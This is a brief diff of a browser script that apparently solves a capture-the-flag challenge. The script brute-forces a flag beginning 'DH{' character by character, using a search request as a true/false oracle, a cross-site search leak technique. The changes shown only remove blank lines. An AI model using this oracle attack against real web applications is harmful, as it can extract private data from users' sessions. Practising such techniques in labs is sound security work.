@@ -13,7 +13,6 @@
             };
         });
     }
-
     async function search(query) {
         try {
             await req(
@@ -24,11 +23,9 @@
             return false;
         }
     }
-
     async function exploit() {
         let chars = "0123456789abcdef}"
         let secret = "DH{";
-
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
@@ -39,6 +36,5 @@
             }
         }
     }
-
     exploit();
 </script>
